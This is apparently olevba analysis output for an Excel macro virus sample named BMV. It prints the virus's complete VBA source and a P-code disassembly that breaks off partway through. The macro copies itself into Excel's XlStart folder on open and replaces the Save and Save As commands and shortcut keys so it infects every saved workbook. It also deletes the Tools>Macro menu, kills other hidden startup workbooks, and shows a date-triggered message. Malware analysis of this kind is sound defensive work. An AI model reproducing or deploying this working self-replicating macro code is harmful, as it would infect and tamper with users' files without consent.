olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.BMV.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO BMV.bas 
in file: Virus.MSExcel.BMV.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/BMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Const strToolbar = "Standard"
Const strButtonName = "Save"
Const iButtonID = 2

Dim NewVersionInstalled As Boolean
Dim SameVersionInstalled As Boolean

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo StartUp
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    CheckVersion
    If NewVersionInstalled Then
        GoTo X
    Else
        If SameVersionInstalled Then
            n = ActiveWorkbook.Name
            GoTo X
        ElseIf NewVersion = False And SameVersion = False Then
            RemoveTheOthers
            GoTo I
        End If
    End If
I:
    fname = ActiveWorkbook.Name
    Sheets("BMV").Copy
    ActiveWorkbook.SaveAs _
       Filename:=Application.Path + "\XlStart\BMV.xls", _
       FileFormat:=xlNormal, password:="", WriteResPassword:="", _
       ReadOnlyRecommended:=False, CreateBackup:=False
    Windows("BMV").Activate
    ActiveWindow.Visible = False
    Workbooks("BMV").Save
    GoTo Z
StartUp:
    If Windows.Count = 1 Then
        Add_BMV_Button
        Add_BMV_Menus
        BMV_Action
    Else
        ActiveWindow.Close
    End If
Z:
If Workbooks.Count <= 1 Then
    Workbooks.Add
End If
X:
    Application.DisplayAlerts = True
End Sub


Private Sub Add_BMV_Button()
    Application.ScreenUpdating = False
    Set btns = Toolbars(strToolbar).ToolbarButtons
    Set btn = ButtonsIndex(btns, "Save")
    If Not (btn Is Nothing) Then
        btn.Delete
        Set btns = Toolbars(strToolbar).ToolbarButtons
        Set btn = ButtonsIndex(btns, strButtonName)
    End If
    iLoc = ButtonsLoc(btns, "Open")
    If iLoc = 0 Then
        Set btn = btns.Add(iButtonID)
    Else
        Set btn = btns.Add(iButtonID, iLoc + 2)
    End If
    btn.Name = strButtonName
    btn.OnAction = "BMV_Save"
End Sub


Private Function ButtonsIndex(ByVal Buttons As Object, ByVal bname As String) As Object
    For Each btn In Buttons
        If btn.Name = bname Then
            Set ButtonsIndex = btn
            Exit For
        End If
    Next
End Function


Private Function ButtonsLoc(ByVal Buttons As Object, ByVal bname As String) As Integer
    n = Buttons.Count
    For I = 1 To n
        If Buttons(I).Name = bname Then
            ButtonsLoc = 1
            Exit For
        End If
    Next
End Function


Sub Add_BMV_Menus()
Attribute Add_BMV_Menus.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Z
    MenuBars(xlWorksheet).Menus("File").MenuItems("Save &As...").Delete
    MenuBars(xlWorksheet).Menus("File").MenuItems _
       .Add Caption:="Save &As...", _
       OnAction:="BMV_FileSaveAs", _
       Before:="Save &Workspace...", _
       StatusBar:="Saves document with new name, file format or password..."

    MenuBars(xlWorksheet).Menus("File").MenuItems("&Save").Delete
    MenuBars(xlWorksheet).Menus("File").MenuItems _
      .Add Caption:="&Save...", OnAction:="BMV_Save", _
       ShortcutKey:="^{s}", _
      Before:="Save &As...", _
      StatusBar:="Saves document..."
      
    MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
Z:
End Sub


Sub BMV_Save()
Attribute BMV_Save.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    Select Case LCase(TypeName(ActiveSheet))
        Case "worksheet"
            If ActiveWorkbook.Path = "" Then
                BMV_FileSaveAs
            Else
                BMV_FileSave
            End If
        Case Else
            Beep
            MsgBox "Save failed...", vbCritical
    End Select
    Application.ScreenUpdating = True
End Sub


Sub BMV_FileSaveAs()
Attribute BMV_FileSaveAs.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    If ActiveSheet.Name <> "" Then
        On Error GoTo Z
        fsave = Application _
                .Dialogs(xlDialogSaveAs).Show
        If fsave <> False Then
            BMV_FileSave
        End If
    End If
Z:
If Windows("BMV").Visible = True Then Windows("BMV").Visible = False
End Sub


Sub BMV_FileSave()
Attribute BMV_FileSave.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    If ActiveSheet.Name <> "" Then
        On Error GoTo Z
        Application.DisplayAlerts = False
        Application.ScreenUpdating = False
        fname = ActiveWorkbook.Name
        Check_BMV
        sc = ActiveWorkbook.Sheets.Count
        Windows("BMV").Activate
        Sheets("BMV").Copy After:=Workbooks(fname).Sheets(sc)
        ActiveWindow.SelectedSheets.Visible = False
        Windows("BMV").Visible = False
        Workbooks("BMV").Save
        ActiveWorkbook.Save
    End If
Z:
If Windows("BMV").Visible = True Then Windows("BMV").Visible = False
End Sub


Sub Check_BMV()
Attribute Check_BMV.VB_ProcData.VB_Invoke_Func = " \n14"
    sc = ActiveWorkbook.Sheets.Count
    For a = 1 To sc
        If Sheets(a).Name = "BMV" Then
            Sheets("BMV").Delete
        End If
    Next a
End Sub


Function VerNum()
Attribute VerNum.VB_ProcData.VB_Invoke_Func = " \n14"
    VerNum = 2
End Function


Sub CheckVersion()
Attribute CheckVersion.VB_ProcData.VB_Invoke_Func = " \n14"
Dim NumFile
Dim Version
    NumFile = FreeFile()
    On Error Resume Next
    Open Application.Path + "\Version.Txt" For Input As NumFile
    If Err <> 0 Then
        Open Application.Path + "\Version.Txt" For Output As NumFile
        Print #NumFile, VerNum
        Close #NumFile
        NewVersionInstalled = False
        SameVersionInstalled = False
    Else
        Input #NumFile, Version
        Close #NumFile
        If Version > VerNum Then
            NewVersionInstalled = True
            SameVersionInstalled = False
        ElseIf Version = VerNum Then
            NewVersionInstalled = False
            SameVersionInstalled = True
        ElseIf Version < VerNum Then
            Open Application.Path + "\Version.Txt" For Output As NumFile
            Print #NumFile, VerNum
            Close #NumFile
            NewVersionInstalled = False
            SameVersionInstalled = False
        End If
    End If
End Sub


Sub RemoveTheOthers()
Attribute RemoveTheOthers.VB_ProcData.VB_Invoke_Func = " \n14"
Dim a As Integer
Dim p As String
Dim fn As String
Dim v As Boolean
    On Error Resume Next
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    For a = 1 To Windows.Count
        p = Application.Path + "\XlStart\"
        fn = p + Workbooks(a).Name
        v = Windows(a).Visible
        If v = False Then
            Windows(a).Visible = True
            Workbooks(a).Save
            ActiveWindow.Close
            Kill fn
        End If
    Next
End Sub


Sub BMV_Action()
Attribute BMV_Action.VB_ProcData.VB_Invoke_Func = " \n14"
Dim NumFile As Integer
    NumFile = FreeFile()
    Application.OnKey "{F1}", "BMV_Help"
    Application.OnKey "^{s}", "BMV_Save"
    Application.OnKey "{F12}", "BMV_FileSaveAs"
    If Day(Now()) = 1 And Month(Now()) = 6 Then
        Application.OnEntry = "BMV_Entry"
        MsgBox "Today is my girl's birthday." + Chr$(13) + "So, say hello to her!", vbInformation
    End If
    On Error GoTo Z

Z:
End Sub


Sub BMV_Entry()
Attribute BMV_Entry.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Z
   Application.ActiveWindow.Caption = ActiveCell.Value
Z:
End Sub


Sub BMV_Help()
Attribute BMV_Help.VB_ProcData.VB_Invoke_Func = " \n14"
    MsgBox "This program is dedicated to " + Application.UserName + Chr$(13) + _
           "from " + Application.OrganizationName + Chr$(13) + _
           "with serial number : BMV2909-91" + Trim(Str$(VerNum)), _
           vbInformation
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  Sophos 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  BM
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.BMV.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/BMV - 12061 bytes
' Line #0:
' Line #1:
' Line #2:
' 	Dim (Const) 
' 	LitStr 0x0008 "Standard"
' 	VarDefn strToolbar
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x0004 "Save"
' 	VarDefn strButtonName
' Line #4:
' 	Dim (Const) 
' 	LitDI2 0x0002 
' 	VarDefn iButtonID
' Line #5:
' Line #6:
' 	Dim 
' 	VarDefn NewVersionInstalled (As Boolean)
' Line #7:
' 	Dim 
' 	VarDefn SameVersionInstalled (As Boolean)
' Line #8:
' Line #9:
' 	FuncDefn (Sub Auto_Open())
' Line #10:
' 	OnError StartUp 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #13:
' 	ArgsCall CheckVersion 0x0000 
' Line #14:
' 	Ld NewVersionInstalled 
' 	IfBlock 
' Line #15:
' 	GoTo X 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	Ld SameVersionInstalled 
' 	IfBlock 
' Line #18:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St n 
' Line #19:
' 	GoTo X 
' Line #20:
' 	Ld NewVersion 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld SameVersion 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #21:
' 	ArgsCall RemoveTheOthers 0x0000 
' Line #22:
' 	GoTo I 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Label I 
' Line #26:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St fname 
' Line #27:
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0000 
' Line #28:
' 	LineCont 0x000C 03 00 07 00 0B 00 07 00 17 00 07 00
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0010 "\XlStart\BMV.xls"
' 	Add 
' 	ParamNamed Filename 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitStr 0x0000 ""
' 	ParamNamed password 
' 	LitStr 0x0000 ""
' 	ParamNamed WriteResPassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed CreateBackup 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0006 
' Line #29:
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #30:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #31:
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #32:
' 	GoTo Z 
' Line #33:
' 	Label StartUp 
' Line #34:
' 	Ld Windows 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	ArgsCall Add_BMV_Button 0x0000 
' Line #36:
' 	ArgsCall Add_BMV_Menus 0x0000 
' Line #37:
' 	ArgsCall BMV_Action 0x0000 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0000 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Label Z 
' Line #42:
' 	Ld Workbooks 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Le 
' 	IfBlock 
' Line #43:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Label X 
' Line #46:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub Add_BMV_Button())
' Line #51:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #52:
' 	SetStmt 
' 	Ld strToolbar 
' 	ArgsLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	Set btns 
' Line #53:
' 	SetStmt 
' 	Ld btns 
' 	LitStr 0x0004 "Save"
' 	ArgsLd ButtonsIndex 0x0002 
' 	Set btn 
' Line #54:
' 	Ld btn 
' 	LitNothing 
' 	Is 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #55:
' 	Ld btn 
' 	ArgsMemCall Delete 0x0000 
' Line #56:
' 	SetStmt 
' 	Ld strToolbar 
' 	ArgsLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	Set btns 
' Line #57:
' 	SetStmt 
' 	Ld btns 
' 	Ld strButtonName 
' 	ArgsLd ButtonsIndex 0x0002 
' 	Set btn 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	Ld btns 
' 	LitStr 0x0004 "Open"
' 	ArgsLd ButtonsLoc 0x0002 
' 	St iLoc 
' Line #60:
' 	Ld iLoc 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	SetStmt 
' 	Ld iButtonID 
' 	Ld btns 
' 	ArgsMemLd Add 0x0001 
' 	Set btn 
' Line #62:
' 	ElseBlock 
' Line #63:
' 	SetStmt 
' 	Ld iButtonID 
' 	Ld iLoc 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld btns 
' 	ArgsMemLd Add 0x0002 
' 	Set btn 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	Ld strButtonName 
' 	Ld btn 
' 	MemSt New 
' Line #66:
' 	LitStr 0x0008 "BMV_Save"
' 	Ld btn 
' 	MemSt OnAction 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' Line #70:
' 	FuncDefn (Private Function ButtonsIndex(ByVal Buttons As Object, ByVal bname As String) As Object)
' Line #71:
' 	StartForVariable 
' 	Ld btn 
' 	EndForVariable 
' 	Ld Buttons 
' 	ForEach 
' Line #72:
' 	Ld btn 
' 	MemLd New 
' 	Ld bname 
' 	Eq 
' 	IfBlock 
' Line #73:
' 	SetStmt 
' 	Ld btn 
' 	Set ButtonsIndex 
' Line #74:
' 	ExitFor 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	StartForVariable 
' 	Next 
' Line #77:
' 	EndFunc 
' Line #78:
' Line #79:
' Line #80:
' 	FuncDefn (Private Function ButtonsLoc(ByVal Buttons As Object, ByVal bname As String) As Integer)
' Line #81:
' 	Ld Buttons 
' 	MemLd Count 
' 	St n 
' Line #82:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld n 
' 	For 
' Line #83:
' 	Ld I 
' 	ArgsLd Buttons 0x0001 
' 	MemLd New 
' 	Ld bname 
' 	Eq 
' 	IfBlock 
' Line #84:
' 	LitDI2 0x0001 
' 	St ButtonsLoc 
' Line #85:
' 	ExitFor 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	StartForVariable 
' 	Next 
' Line #88:
' 	EndFunc 
' Line #89:
' Line #90:
' Line #91:
' 	FuncDefn (Sub Add_BMV_Menus())
' Line #92:
' 	OnError Z 
' Line #93:
' 	LitStr 0x000B "Save &As..."
' 	LitStr 0x0004 "File"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #94:
' 	LineCont 0x0010 0B 00 07 00 11 00 07 00 15 00 07 00 19 00 07 00
' 	LitStr 0x000B "Save &As..."
' 	ParamNamed Caption 
' 	LitStr 0x000E "BMV_FileSaveAs"
' 	ParamNamed OnAction 
' 	LitStr 0x0012 "Save &Workspace..."
' 	ParamNamed Before 
' 	LitStr 0x0038 "Saves document with new name, file format or password..."
' 	ParamNamed StatusBar 
' 	LitStr 0x0004 "File"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	MemLd MenuItems 
' 	ArgsMemCall Add 0x0004 
' Line #95:
' Line #96:
' 	LitStr 0x0005 "&Save"
' 	LitStr 0x0004 "File"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #97:
' 	LineCont 0x0010 0B 00 06 00 15 00 07 00 19 00 06 00 1D 00 06 00
' 	LitStr 0x0008 "&Save..."
' 	ParamNamed Caption 
' 	LitStr 0x0008 "BMV_Save"
' 	ParamNamed OnAction 
' 	LitStr 0x0004 "^{s}"
' 	ParamNamed ShortcutKey 
' 	LitStr 0x000B "Save &As..."
' 	ParamNamed Before 
' 	LitStr 0x0011 "Saves document..."
' 	ParamNamed StatusBar 
' 	LitStr 0x0004 "File"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	MemLd MenuItems 
' 	ArgsMemCall Add 0x0005 
' Line #98:
' Line #99:
' 	LitStr 0x0009 "&Macro..."
' 	LitStr 0x0005 "Tools"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #100:
' 	Label Z 
' Line #101:
' 	EndSub 
' Line #102:
' Line #103:
' Line #104:
' 	FuncDefn (Sub BMV_Save())
' Line #105:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #106:
' 	Ld ActiveSheet 
' 	ArgsLd TypeName 0x0001 
' 	ArgsLd LCase 0x0001 
' 	SelectCase 
' Line #107:
' 	LitStr 0x0009 "worksheet"
' 	Case 
' 	CaseDone 
' Line #108:
' 	Ld ActiveWorkbook 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #109:
' 	ArgsCall BMV_FileSaveAs 0x0000 
' Line #110:
' 	ElseBlock 
' Line #111:
' 	ArgsCall BMV_FileSave 0x0000 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	CaseElse 
' Line #114:
' 	ArgsCall Beep 0x0000 
' Line #115:
' 	LitStr 0x000E "Save failed..."
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #116:
' 	EndSelect 
' Line #117:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #118:
' 	EndSub 
' Line #119:
' Line #120:
' Line #121:
' 	FuncDefn (Sub BMV_FileSaveAs())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	Ld ActiveSheet 
' 	MemLd New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #124:
' 	OnError Z 
' Line #125:
' 	LineCont 0x0004 03 00 10 00
' 	Ld xlDialogSaveAs 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	MemLd Show 
' 	St fsave 
' Line #126:
' 	Ld fsave 
' 	LitVarSpecial (False)
' 	Ne 
' 	IfBlock 
' Line #127:
' 	ArgsCall BMV_FileSave 0x0000 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Label Z 
' Line #131:
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Windows 0x0001 
' 	MemLd Visible 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Windows 0x0001 
' 	MemSt Visible 
' 	EndIf 
' Line #132:
' 	EndSub 
' Line #133:
' Line #134:
' Line #135:
' 	FuncDefn (Sub BMV_FileSave())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	Ld ActiveSheet 
' 	MemLd New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #138:
' 	OnError Z 
' Line #139:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #140:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #141:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St fname 
' Line #142:
' 	ArgsCall Check_BMV 0x0000 
' Line #143:
' 	Ld ActiveWorkbook 
' 	MemLd Sheets 
' 	MemLd Count 
' 	St sc 
' Line #144:
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #145:
' 	Ld sc 
' 	Ld fname 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed After 
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #146:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemLd SelectedSheets 
' 	MemSt Visible 
' Line #147:
' 	LitVarSpecial (False)
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Windows 0x0001 
' 	MemSt Visible 
' Line #148:
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #149:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	Label Z 
' Line #152:
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Windows 0x0001 
' 	MemLd Visible 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Windows 0x0001 
' 	MemSt Visible 
' 	EndIf 
' Line #153:
' 	EndSub 
' Line #154:
' Line #155:
' Line #156:
' 	FuncDefn (Sub Check_BMV())
' Line #157:
' 	Ld ActiveWorkbook 
' 	MemLd Sheets 
' 	MemLd Count 
' 	St sc 
' Line #158:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld sc 
' 	For 
' Line #159:
' 	Ld a 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "BMV"
' 	Eq 
' 	IfBlock 
' Line #160:
' 	LitStr 0x0003 "BMV"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	NextVar 
' Line #163:
' 	EndSub 
' Line #164:
' Line #165:
' Line #166:
' 	FuncDefn (Function VerNum())
' Line #167:
' 	LitDI2 0x0002 
' 	St VerNum 
' Line #168:
' 	EndFunc 
' Line #169:
' Line #170:
' Line #171:
' 	FuncDefn (Sub CheckVersion())
' Line #172:
' 	Dim 
' 	VarDefn NumFile
' Line #173:
' 	Dim 
' 	VarDefn Version
' Line #174:
' 	ArgsLd Friend 0x0000 
' 	St NumFile 
' Line #175:
' 	OnError (Resume Next) 
' Line #176:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000C "\Version.Txt"
' 	Add 
' 	Ld NumFile 
' 	LitDefault 
' 	Open (For Input)
' Line #177:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #178:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000C "\Version.Txt"
' 	Add 
' 	Ld NumFile 
' 	LitDefault 
' 	Open (For Output)
' Line #179:
' 	Ld NumFile 
' 	Sharp 
' 	PrintChan 
' 	Ld VerNum 
' 	PrintItemNL 
' Line #180:
' 	Ld NumFile 
' 	Sharp 
' 	Close 0x0001 
' Line #181:
' 	LitVarSpecial (False)
' 	St NewVersionInstalled 
' Line #182:
' 	LitVarSpecial (False)
' 	St SameVersionInstalled 
' Line #183:
' 	ElseBlock 
' Line #184:
' 	Ld NumFile 
' 	Sharp 
' 	Input 
' 	Ld Version 
' 	InputItem 
' 	InputDone 
' Line #185:
' 	Ld NumFile 
' 	Sharp 
' 	Close 0x0001 
' Line #186:
' 	Ld Version 
' 	Ld VerNum 
' 	Gt 
' 	IfBlock 
' Line #187:
' 	LitVarSpecial (True)
' 	St NewVersionInstalled 
' Line #188:
' 	LitVarSpecial (False)
' 	St SameVersionInstalled 
' Line #189:
' 	Ld Version 
' 	Ld VerNum 
' 	Eq 
' 	ElseIfBlock 
' Line #190:
' 	LitVarSpecial (False)
' 	St NewVersionInstalled 
' Line #191:
' 	LitVarSpecial (True)
' 	St SameVersionInstalled 
' Line #192:
' 	Ld Version 
' 	Ld VerNum 
' 	Lt 
' 	ElseIfBlock 
' Line #193:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000C "\Version.Txt"
' 	Add 
' 	Ld NumFile 
' 	LitDefault 
' 	Open (For Output)
' Line #194:
' 	Ld NumFile 
' 	Sharp 
' 	PrintChan 
' 	Ld VerNum 
' 	PrintItemNL 
' Line #195:
' 	Ld NumFile 
' 	Sharp 
' 	Close 0x0001 
' Line #196:
' 	LitVarSpecial (False)
' 	St NewVersionInstalled 
' Line #197:
' 	LitVarSpecial (False)
' 	St SameVersionInstalled 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	EndSub 
' Line #201:
' Line #202:
' Line #203:
' 	FuncDefn (Sub RemoveTheOthers())
' Line #204:
' 	Dim 
' 	VarDefn a (As Integer)
' Line #205:
' 	Dim 
' 	VarDefn p (As String)
' Line #206:
' 	Dim 
' 	VarDefn fn (As String)
' Line #207:
' 	Dim 
' 	VarDefn v (As Boolean)
' Line #208:
' 	OnError (Resume Next) 
' Line #209:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #210:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #211:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Windows 
' 	MemLd Count 
' 	For 
' Line #212:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0009 "\XlStart\"
' 	Add 
' 	St p 
' Line #213:
' 	Ld p 
' 	Ld a 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd New 
' 	Add 
' 	St fn 
' Line #214:
' 	Ld a 
' 	ArgsLd Windows 0x0001 
' 	MemLd Visible 
' 	St v 
' Line #215:
' 	Ld v 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #216:
' 	LitVarSpecial (True)
' 	Ld a 
' 	ArgsLd Windows 0x0001 
' 	MemSt Visible 
' Line #217:
' 	Ld a 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #218:
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0000 
' Line #219:
' 	Ld fn 
' 	ArgsCall Kill 0x0001 
' Line #220:
' 	EndIfBlock 
' Line #221:
' 	StartForVariable 
' 	Next 
' Line #222:
' 	EndSub 
' Line #223:
' Line #224:
' Line #225:
' 	FuncDefn (Sub BMV_Action())
' Line #226:
' 	Dim 
' 	VarDefn NumFile (As Integer)
' Line #227:
' 	ArgsLd Friend 0x0000 
' 	St NumFile 
' Line #228:
' 	LitStr 0x0004 "{F1}"
' 	LitStr 0x0008 "BMV_Help"
' 	Ld Application 
' 	ArgsMemCall OnKey 0x0002 
' Line #229:
' 	LitStr 0x0004 "^{s}"
' 	LitStr 0x0008 "BMV_Save"
' 	Ld Application 
' 	ArgsMemCall OnKey 0x0002 
' Line #230:
' 	LitStr 0x0005 "{F12}"
' 	LitStr 0x000E "BMV_FileSaveAs"
' 	Ld Application 
' 	ArgsMemCall OnKey 0x0002 
' Line #231:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #232:
' 	LitStr 0x0009 "BMV_Entry"
' 	Ld Application 
' 	MemSt OnEntry 
' Line #233:
' 	LitStr 0x001C "Today is my girl's birthday."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0015 "So, say hello to her!"
' 	Add 
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #234:
' 	EndIfBlock 
' Line #235:
' 	OnError Z 
' Line #236:
' Line #237:
' 	Label Z 
' Line #238:
' 	EndSub 
' Line #239:
' Line #240:
' Line #241:
' 	FuncDefn (Sub BMV_Entry())
' Line #242:
' 	OnError Z 
' Line #243:
' 	Ld ActiveCell 
' 	MemLd Value 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #244:
' 	Label Z 
' Line #245:
' 	EndSub 
' Line #246:
' Line #247:
' Line #248:
' 	FuncDefn (Sub BMV_Help())
' Line #249:
' 	LineCont 0x000C 0C 00 0B 00 17 00 0B 00 21 00 0B 00
' 	LitStr 0x001D "This program is dedicated to "
' 	Ld Application 
' 	MemLd UserName 
' 	Add 
' 	LitDI2 0x000D 
